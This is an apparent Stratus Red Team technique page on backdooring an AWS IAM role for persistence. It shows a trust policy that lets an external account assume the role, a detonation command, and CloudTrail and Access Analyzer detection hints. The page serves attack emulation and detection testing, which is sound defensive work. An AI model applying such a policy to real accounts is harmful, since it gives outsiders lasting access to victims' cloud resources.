---
title: Backdoor an IAM Role
---

# Backdoor an IAM Role


 <span class="smallcaps w3-badge w3-blue w3-round w3-text-white" title="This attack technique can be detonated multiple times">idempotent</span> 

Platform: AWS

## MITRE ATT&CK Tactics


- Persistence

## Description


Establishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.

<span style="font-variant: small-caps;">Warm-up</span>: 

- Create an IAM role.

<span style="font-variant: small-caps;">Detonation</span>: 

- Update the assume role policy of the IAM role to backdoor it, making it accessible from an external, fictitious AWS account:

<pre>
<code>
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "ec2.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    },
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::193672423079:root"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
</code>
</pre>


## Instructions

```bash title="Detonate with Stratus Red Team"
stratus detonate aws.persistence.iam-backdoor-role
```
## Detection


- Using CloudTrail's <code>UpdateAssumeRolePolicy</code> event.

- Through [IAM Access Analyzer](https://docs.aws.amazon.com/IAM/latest/UserGuide/access-analyzer-resources.html#access-analyzer-iam-role), 
which generates a finding when a role can be assumed from a new AWS account or publicly.


